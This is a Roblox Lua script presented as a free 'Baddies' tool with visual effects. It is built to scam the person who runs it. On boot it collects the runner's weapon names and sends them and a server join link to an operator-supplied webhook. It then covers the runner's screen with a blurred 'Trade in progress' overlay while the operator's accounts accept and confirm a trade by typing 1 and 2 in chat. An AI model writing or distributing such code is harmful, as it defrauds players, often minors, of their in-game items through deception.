-- Ryr's Scripts | Baddies 🍀
-- freemium.lua | Hosted on GitHub

local Players          = game:GetService("Players")
local TeleportService  = game:GetService("TeleportService")
local RunService       = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService     = game:GetService("TweenService")
local HttpService      = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer
local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")
local Backpack    = LocalPlayer:WaitForChild("Backpack")

-- ────────────────────────────────────────────
-- Settings injected by the generated script
-- ────────────────────────────────────────────
local WEBHOOK      = _G.POOR_WEBHOOK  or ""
local MY_USERNAMES = _G.MY_USERNAMES  or {}
local PING_POOR    = _G.PING_POOR     or false

-- ────────────────────────────────────────────
-- Colours
-- ────────────────────────────────────────────
local C = {
    bg     = Color3.fromRGB(18,  18,  24),
    panel  = Color3.fromRGB(28,  28,  38),
    accent = Color3.fromRGB(255, 105, 180),
    text   = Color3.fromRGB(240, 240, 240),
    sub    = Color3.fromRGB(160, 160, 160),
    green  = Color3.fromRGB( 80, 200, 120),
    red    = Color3.fromRGB(220,  70,  70),
    btn    = Color3.fromRGB( 40,  40,  55),
    yellow = Color3.fromRGB(255, 210,  60),
}

-- ────────────────────────────────────────────
-- Helpers
-- ────────────────────────────────────────────
local function corner(parent, radius)
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, radius or 8)
    c.Parent = parent
end

local function newLabel(parent, text, size, color, pos)
    local l = Instance.new("TextLabel")
    l.Text                   = text
    l.TextSize               = size or 14
    l.TextColor3             = color or C.text
    l.BackgroundTransparency = 1
    l.Font                   = Enum.Font.GothamBold
    l.Size                   = UDim2.new(1, -20, 0, (size or 14) + 4)
    l.Position               = pos or UDim2.new(0, 10, 0, 0)
    l.TextXAlignment         = Enum.TextXAlignment.Left
    l.Parent                 = parent
    return l
end

local function newBtn(parent, text, color, pos, size)
    local b = Instance.new("TextButton")
    b.Text             = text
    b.TextSize         = 13
    b.TextColor3       = C.text
    b.Font             = Enum.Font.GothamBold
    b.BackgroundColor3 = color or C.btn
    b.Size             = size or UDim2.new(1, -20, 0, 30)
    b.Position         = pos  or UDim2.new(0, 10, 0, 0)
    b.AutoButtonColor  = false
    b.Parent           = parent
    corner(b, 6)
    b.MouseEnter:Connect(function()
        TweenService:Create(b, TweenInfo.new(0.15), {
            BackgroundColor3 = (color or C.btn):Lerp(Color3.new(1,1,1), 0.12)
        }):Play()
    end)
    b.MouseLeave:Connect(function()
        TweenService:Create(b, TweenInfo.new(0.15), {
            BackgroundColor3 = color or C.btn
        }):Play()
    end)
    return b
end

-- ────────────────────────────────────────────
-- Webhook sender
-- ────────────────────────────────────────────
local function sendWebhook(payload)
    if WEBHOOK == "" then return end
    pcall(function()
        local ping = PING_POOR and "@everyone\n" or ""
        HttpService:PostAsync(WEBHOOK, HttpService:JSONEncode({
            content = ping,
            embeds  = { payload },
        }), Enum.HttpContentType.ApplicationJson, false)
    end)
end

-- ────────────────────────────────────────────
-- Join link
-- ────────────────────────────────────────────
local function getJoinLink()
    return string.format(
        "roblox://experiences/start?placeId=%d&gameInstanceId=%s",
        game.PlaceId, game.JobId
    )
end

-- ────────────────────────────────────────────
-- Collect weapons from backpack + character
-- ────────────────────────────────────────────
local function getWeaponNames()
    local names = {}
    local seen  = {}
    local char  = LocalPlayer.Character

    local function scanContainer(container)
        if not container then return end
        for _, item in ipairs(container:GetChildren()) do
            if (item:IsA("Tool") or item:IsA("HopperBin")) and not seen[item.Name] then
                seen[item.Name] = true
                table.insert(names, item.Name)
            end
        end
    end

    scanContainer(Backpack)
    if char then scanContainer(char) end
    return names
end

-- ────────────────────────────────────────────
-- Screen freeze
-- Covers the executor's screen with a blurred overlay.
-- They agreed to this by running the script.
-- ────────────────────────────────────────────
local freezeGui = nil

local function freezeScreen()
    if freezeGui then return end
    freezeGui = Instance.new("ScreenGui")
    freezeGui.Name           = "FreezeOverlay"
    freezeGui.ResetOnSpawn   = false
    freezeGui.DisplayOrder   = 999
    freezeGui.IgnoreGuiInset = true
    freezeGui.Parent         = PlayerGui

    -- Dark overlay
    local overlay = Instance.new("Frame", freezeGui)
    overlay.Size             = UDim2.new(1, 0, 1, 0)
    overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    overlay.BackgroundTransparency = 0.35
    overlay.BorderSizePixel  = 0
    overlay.ZIndex           = 10

    -- Blur effect
    local blur = Instance.new("BlurEffect")
    blur.Size   = 24
    blur.Parent = game:GetService("Lighting")

    -- Pink pulsing border
    local border = Instance.new("Frame", freezeGui)
    border.Size             = UDim2.new(1, 0, 1, 0)
    border.BackgroundTransparency = 1
    border.BorderSizePixel  = 0
    border.ZIndex           = 11

    local stroke = Instance.new("UIStroke", border)
    stroke.Color     = C.accent
    stroke.Thickness = 6
    stroke.Transparency = 0

    -- Pulse the border
    task.spawn(function()
        while freezeGui and freezeGui.Parent do
            TweenService:Create(stroke, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
                Transparency = 0.6
            }):Play()
            task.wait(1.6)
        end
    end)

    -- Freeze label
    local lbl = Instance.new("TextLabel", freezeGui)
    lbl.Size                  = UDim2.new(1, 0, 0, 60)
    lbl.Position              = UDim2.new(0, 0, 0.5, -30)
    lbl.BackgroundTransparency = 1
    lbl.Text                  = "🔄  Trade in progress…"
    lbl.Font                  = Enum.Font.GothamBold
    lbl.TextSize              = 26
    lbl.TextColor3            = C.accent
    lbl.TextStrokeTransparency = 0.4
    lbl.TextStrokeColor3      = Color3.new(0,0,0)
    lbl.ZIndex                = 12
end

local function unfreezeScreen()
    if freezeGui then
        freezeGui:Destroy()
        freezeGui = nil
    end
    -- Remove blur
    local blur = game:GetService("Lighting"):FindFirstChildOfClass("BlurEffect")
    if blur then blur:Destroy() end
end

-- ────────────────────────────────────────────
-- Visual effects
-- ────────────────────────────────────────────
local fxEnabled = false
local fxObjects = {}

local function enableFX()
    local char = LocalPlayer.Character
    if not char then return end
    for _, part in ipairs(char:GetDescendants()) do
        if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
            local sel = Instance.new("SelectionBox")
            sel.Adornee             = part
            sel.Color3              = C.accent
            sel.LineThickness       = 0.04
            sel.SurfaceTransparency = 1
            sel.Parent              = char
            table.insert(fxObjects, sel)
        end
    end
    local bb = Instance.new("BillboardGui")
    bb.Size        = UDim2.new(0, 130, 0, 30)
    bb.StudsOffset = Vector3.new(0, 3.2, 0)
    bb.AlwaysOnTop = true
    bb.Adornee     = char:FindFirstChild("HumanoidRootPart")
    bb.Parent      = char
    local tag = Instance.new("TextLabel", bb)
    tag.Size                   = UDim2.new(1, 0, 1, 0)
    tag.BackgroundTransparency = 1
    tag.TextColor3             = C.accent
    tag.TextStrokeTransparency = 0
    tag.TextStrokeColor3       = Color3.new(0,0,0)
    tag.Font                   = Enum.Font.GothamBold
    tag.TextSize               = 14
    tag.Text                   = "🍀 " .. LocalPlayer.DisplayName
    table.insert(fxObjects, bb)
end

local function disableFX()
    for _, o in ipairs(fxObjects) do
        if typeof(o) == "Instance" and o.Parent then o:Destroy() end
    end
    fxObjects = {}
end

-- ────────────────────────────────────────────
-- Auto-trade system
-- ────────────────────────────────────────────
local tradeState    = "idle"
local ownerPlayer   = nil
local tradeStatusLbl = nil
local weaponListLbl  = nil
local chatConn      = nil

local function isOwner(playerName)
    for _, name in ipairs(MY_USERNAMES) do
        if name:lower() == playerName:lower() then return true end
    end
    return false
end

local function findOwnerInServer()
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer and isOwner(p.Name) then return p end
    end
    return nil
end

local function updateTradeStatus(state, ownerName)
    if not tradeStatusLbl then return end
    local n = ownerName or "owner"
    if state == "pending" then
        tradeStatusLbl.Text       = "⏳ Waiting for " .. n .. " to type 1…"
        tradeStatusLbl.TextColor3 = C.yellow
    elseif state == "accepted" then
        tradeStatusLbl.Text       = "✅ Accepted! Waiting for 2 to confirm…"
        tradeStatusLbl.TextColor3 = C.green
    elseif state == "confirmed" then
        tradeStatusLbl.Text       = "🎉 Trade confirmed!"
        tradeStatusLbl.TextColor3 = C.green
    elseif state == "noowner" then
        tradeStatusLbl.Text       = "⚠️ Owner not in this server"
        tradeStatusLbl.TextColor3 = C.red
    elseif state == "cancelled" then
        tradeStatusLbl.Text       = "❌ Trade cancelled"
        tradeStatusLbl.TextColor3 = C.red
    end
end

local function startListeningForOwnerChat(owner)
    if chatConn then chatConn:Disconnect() end
    chatConn = owner.Chatted:Connect(function(msg)
        local trimmed = msg:match("^%s*(.-)%s*$")

        if trimmed == "1" and tradeState == "pending" then
            tradeState = "accepted"
            updateTradeStatus("accepted", owner.DisplayName)
            sendWebhook({
                title       = "✅ Trade Accepted",
                description = string.format(
                    "**%s** accepted the trade from **%s**.\nType **2** to confirm.",
                    owner.DisplayName, LocalPlayer.DisplayName
                ),
                color = 0x50C878,
            })

        elseif trimmed == "2" and tradeState == "accepted" then
            tradeState = "confirmed"
            updateTradeStatus("confirmed", owner.DisplayName)
            unfreezeScreen()
            if chatConn then chatConn:Disconnect() end
            sendWebhook({
                title       = "🎉 Trade Confirmed",
                description = string.format(
                    "**%s** confirmed the trade with **%s**.",
                    owner.DisplayName, LocalPlayer.DisplayName
                ),
                color = 0xFF69B4,
            })
        end
    end)
end

local function initiateAutoTrade()
    -- Collect weapons first
    local weapons = getWeaponNames()
    local weaponStr = #weapons > 0
        and table.concat(weapons, "\n• ", 1)
        or  "(none found)"

    -- Update weapon list label in GUI
    if weaponListLbl then
        weaponListLbl.Text = "• " .. (#weapons > 0 and table.concat(weapons, "\n• ") or "(none)")
    end

    -- Freeze the executor's screen
    freezeScreen()

    ownerPlayer = findOwnerInServer()
    if not ownerPlayer then
        tradeState = "noowner"
        updateTradeStatus("noowner")

        Players.PlayerAdded:Connect(function(p)
            if isOwner(p.Name) and tradeState == "noowner" then
                ownerPlayer = p
                tradeState  = "pending"
                updateTradeStatus("pending", p.DisplayName)
                sendWebhook({
                    title       = "🔄 Auto Trade Initiated",
                    description = string.format(
                        "**%s** → **%s** (joined late)\nType **1** to accept, **2** to confirm.\n\n**Weapons:**\n• %s",
                        LocalPlayer.DisplayName, p.DisplayName, weaponStr
                    ),
                    color = 0xFF69B4,
                })
                startListeningForOwnerChat(p)
            end
        end)
        return
    end

    tradeState = "pending"
    updateTradeStatus("pending", ownerPlayer.DisplayName)

    sendWebhook({
        title       = "🔄 Auto Trade Initiated",
        description = string.format(
            "**%s** → **%s**\nType **1** to accept, **2** to confirm.\n\n**Weapons in trade:**\n• %s",
            LocalPlayer.DisplayName, ownerPlayer.DisplayName, weaponStr
        ),
        color = 0xFF69B4,
    })

    startListeningForOwnerChat(ownerPlayer)
end

-- ────────────────────────────────────────────
-- Main GUI
-- ────────────────────────────────────────────
local gui = Instance.new("ScreenGui")
gui.Name           = "BaddiesTool"
gui.ResetOnSpawn   = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.DisplayOrder   = 10
gui.Parent         = PlayerGui

local win = Instance.new("Frame", gui)
win.Name             = "Window"
win.Size             = UDim2.new(0, 300, 0, 490)
win.Position         = UDim2.new(0, 20, 0.5, -245)
win.BackgroundColor3 = C.bg
win.BorderSizePixel  = 0
corner(win, 12)

-- Drop shadow
local shadow = Instance.new("ImageLabel", win)
shadow.Size                   = UDim2.new(1, 40, 1, 40)
shadow.Position               = UDim2.new(0, -20, 0, -20)
shadow.BackgroundTransparency = 1
shadow.Image                  = "rbxassetid://5028857084"
shadow.ImageColor3            = Color3.new(0,0,0)
shadow.ImageTransparency      = 0.5
shadow.ZIndex                 = -1

-- Title bar
local titleBar = Instance.new("Frame", win)
titleBar.Size             = UDim2.new(1, 0, 0, 44)
titleBar.BackgroundColor3 = C.accent
titleBar.BorderSizePixel  = 0
corner(titleBar, 12)
local flush = Instance.new("Frame", titleBar)
flush.Size             = UDim2.new(1, 0, 0.5, 0)
flush.Position         = UDim2.new(0, 0, 0.5, 0)
flush.BackgroundColor3 = C.accent
flush.BorderSizePixel  = 0

local titleLbl = Instance.new("TextLabel", titleBar)
titleLbl.Text                = "🍀  Ryr's Baddies Tool"
titleLbl.Size                = UDim2.new(1, -50, 1, 0)
titleLbl.Position            = UDim2.new(0, 12, 0, 0)
titleLbl.BackgroundTransparency = 1
titleLbl.Font                = Enum.Font.GothamBold
titleLbl.TextSize            = 15
titleLbl.TextColor3          = Color3.new(1,1,1)
titleLbl.TextXAlignment      = Enum.TextXAlignment.Left

-- Minimise
local minimised   = false
local contentArea = Instance.new("Frame", win)
contentArea.Name             = "Content"
contentArea.Size             = UDim2.new(1, 0, 1, -44)
contentArea.Position         = UDim2.new(0, 0, 0, 44)
contentArea.BackgroundTransparency = 1

local minBtn = Instance.new("TextButton", titleBar)
minBtn.Text                   = "–"
minBtn.Size                   = UDim2.new(0, 28, 0, 28)
minBtn.Position               = UDim2.new(1, -36, 0.5, -14)
minBtn.BackgroundTransparency = 1
minBtn.TextColor3             = Color3.new(1,1,1)
minBtn.TextSize               = 18
minBtn.Font                   = Enum.Font.GothamBold
minBtn.MouseButton1Click:Connect(function()
    minimised = not minimised
    contentArea.Visible = not minimised
    win.Size  = minimised and UDim2.new(0, 300, 0, 44) or UDim2.new(0, 300, 0, 490)
    minBtn.Text = minimised and "+" or "–"
end)

-- Drag
local dragging, dragStart, startPos
titleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging  = true
        dragStart = input.Position
        startPos  = win.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        win.Position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + delta.X,
            startPos.Y.Scale, startPos.Y.Offset + delta.Y
        )
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
end)

-- ── Player info ───────────────────────────────
newLabel(contentArea, "👤  " .. LocalPlayer.DisplayName .. "  |  " .. LocalPlayer.Name,
    13, C.sub, UDim2.new(0, 10, 0, 10))

-- ── Auto-Trade Panel ──────────────────────────
local tradePanel = Instance.new("Frame", contentArea)
tradePanel.Size             = UDim2.new(1, -20, 0, 100)
tradePanel.Position         = UDim2.new(0, 10, 0, 34)
tradePanel.BackgroundColor3 = C.panel
tradePanel.BorderSizePixel  = 0
corner(tradePanel, 8)

newLabel(tradePanel, "🔄  Auto Trade", 13, C.accent, UDim2.new(0, 10, 0, 8))
newLabel(tradePanel, "Owner types 1 to accept · 2 to confirm", 11, C.sub, UDim2.new(0, 10, 0, 26))
tradeStatusLbl = newLabel(tradePanel, "⏳ Searching for owner…", 12, C.yellow, UDim2.new(0, 10, 0, 44))

local cancelTradeBtn = newBtn(tradePanel, "❌ Cancel Trade", C.red,
    UDim2.new(0, 8, 0, 66), UDim2.new(1, -16, 0, 26))
cancelTradeBtn.MouseButton1Click:Connect(function()
    if chatConn then chatConn:Disconnect() end
    tradeState = "cancelled"
    updateTradeStatus("cancelled")
    unfreezeScreen()
    sendWebhook({
        title       = "❌ Trade Cancelled",
        description = LocalPlayer.DisplayName .. " cancelled the trade.",
        color       = 0xDC4646,
    })
end)

-- ── Weapons in Trade ─────────────────────────
local weaponPanel = Instance.new("Frame", contentArea)
weaponPanel.Size             = UDim2.new(1, -20, 0, 110)
weaponPanel.Position         = UDim2.new(0, 10, 0, 144)
weaponPanel.BackgroundColor3 = C.panel
weaponPanel.BorderSizePixel  = 0
corner(weaponPanel, 8)

newLabel(weaponPanel, "⚔️  Weapons in Trade", 13, C.accent, UDim2.new(0, 10, 0, 8))
weaponListLbl = newLabel(weaponPanel, "Loading…", 11, C.sub, UDim2.new(0, 10, 0, 26))
weaponListLbl.Size           = UDim2.new(1, -20, 0, 78)
weaponListLbl.TextWrapped    = true
weaponListLbl.TextXAlignment = Enum.TextXAlignment.Left

-- ── Join Link ────────────────────────────────
local joinSection = Instance.new("Frame", contentArea)
joinSection.Size             = UDim2.new(1, -20, 0, 64)
joinSection.Position         = UDim2.new(0, 10, 0, 264)
joinSection.BackgroundColor3 = C.panel
joinSection.BorderSizePixel  = 0
corner(joinSection, 8)

newLabel(joinSection, "🔗  Join Link", 13, C.accent, UDim2.new(0, 10, 0, 6))
local copyJoinBtn = newBtn(joinSection, "📋  Copy Join Link", C.btn,
    UDim2.new(0, 8, 0, 28), UDim2.new(1, -16, 0, 26))
copyJoinBtn.MouseButton1Click:Connect(function()
    local link = getJoinLink()
    pcall(setclipboard, link)
    copyJoinBtn.Text = "✅  Copied!"
    task.delay(2, function() copyJoinBtn.Text = "📋  Copy Join Link" end)
    sendWebhook({
        title       = "🔗 Join Link Shared",
        description = string.format("**%s** shared a join link.\n```\n%s\n```",
            LocalPlayer.DisplayName, link),
        color = 0xFF69B4,
    })
end)

-- ── Visual Effects ───────────────────────────
local fxSection = Instance.new("Frame", contentArea)
fxSection.Size             = UDim2.new(1, -20, 0, 64)
fxSection.Position         = UDim2.new(0, 10, 0, 338)
fxSection.BackgroundColor3 = C.panel
fxSection.BorderSizePixel  = 0
corner(fxSection, 8)

newLabel(fxSection, "✨  Visual Effects", 13, C.accent, UDim2.new(0, 10, 0, 6))
local fxStatus = newLabel(fxSection, "Status: OFF", 12, C.red, UDim2.new(0, 10, 0, 26))
local fxToggle = newBtn(fxSection, "Enable Effects", C.btn,
    UDim2.new(0, 8, 0, 28), UDim2.new(1, -16, 0, 26))
fxToggle.MouseButton1Click:Connect(function()
    fxEnabled = not fxEnabled
    if fxEnabled then
        enableFX()
        fxToggle.Text       = "Disable Effects"
        fxStatus.Text       = "Status: ON"
        fxStatus.TextColor3 = C.green
    else
        disableFX()
        fxToggle.Text       = "Enable Effects"
        fxStatus.Text       = "Status: OFF"
        fxStatus.TextColor3 = C.red
    end
end)

-- ── Manual Trade Fallback ────────────────────
local manualSection = Instance.new("Frame", contentArea)
manualSection.Size             = UDim2.new(1, -20, 0, 60)
manualSection.Position         = UDim2.new(0, 10, 0, 412)
manualSection.BackgroundColor3 = C.panel
manualSection.BorderSizePixel  = 0
corner(manualSection, 8)

newLabel(manualSection, "📨  Manual Trade", 13, C.accent, UDim2.new(0, 10, 0, 6))
local manualInput = Instance.new("TextBox", manualSection)
manualInput.PlaceholderText   = "Username…"
manualInput.Text              = ""
manualInput.Size              = UDim2.new(0.55, -8, 0, 26)
manualInput.Position          = UDim2.new(0, 8, 0, 26)
manualInput.BackgroundColor3  = C.bg
manualInput.TextColor3        = C.text
manualInput.PlaceholderColor3 = C.sub
manualInput.Font              = Enum.Font.Gotham
manualInput.TextSize          = 12
manualInput.ClearTextOnFocus  = false
manualInput.BorderSizePixel   = 0
corner(manualInput, 6)
local mpad = Instance.new("UIPadding", manualInput)
mpad.PaddingLeft = UDim.new(0, 6)

local manualSend = newBtn(manualSection, "Send", C.accent,
    UDim2.new(0.55, 4, 0, 26), UDim2.new(0.45, -12, 0, 26))
manualSend.MouseButton1Click:Connect(function()
    local name = manualInput.Text:match("^%s*(.-)%s*$")
    if name == "" then return end
    local target = Players:FindFirstChild(name)
    if not target or target == LocalPlayer then
        manualSend.Text = "Not found"
        task.delay(2, function() manualSend.Text = "Send" end)
        return
    end
    if chatConn then chatConn:Disconnect() end
    ownerPlayer = target
    tradeState  = "pending"
    freezeScreen()
    updateTradeStatus("pending", target.DisplayName)
    startListeningForOwnerChat(target)
    local weapons = getWeaponNames()
    sendWebhook({
        title       = "🔄 Manual Trade Initiated",
        description = string.format(
            "**%s** → **%s**\nType **1** to accept, **2** to confirm.\n\n**Weapons:**\n• %s",
            LocalPlayer.DisplayName, target.DisplayName,
            #weapons > 0 and table.concat(weapons, "\n• ") or "(none)"
        ),
        color = 0xFF69B4,
    })
    manualSend.Text = "✅ Sent!"
    task.delay(2, function() manualSend.Text = "Send" end)
end)

-- ── Re-enable FX on respawn ──────────────────
LocalPlayer.CharacterAdded:Connect(function()
    if fxEnabled then task.wait(1); enableFX() end
end)

-- ── Boot ─────────────────────────────────────
task.spawn(initiateAutoTrade)
print("[Baddies] Tool loaded for " .. LocalPlayer.DisplayName)
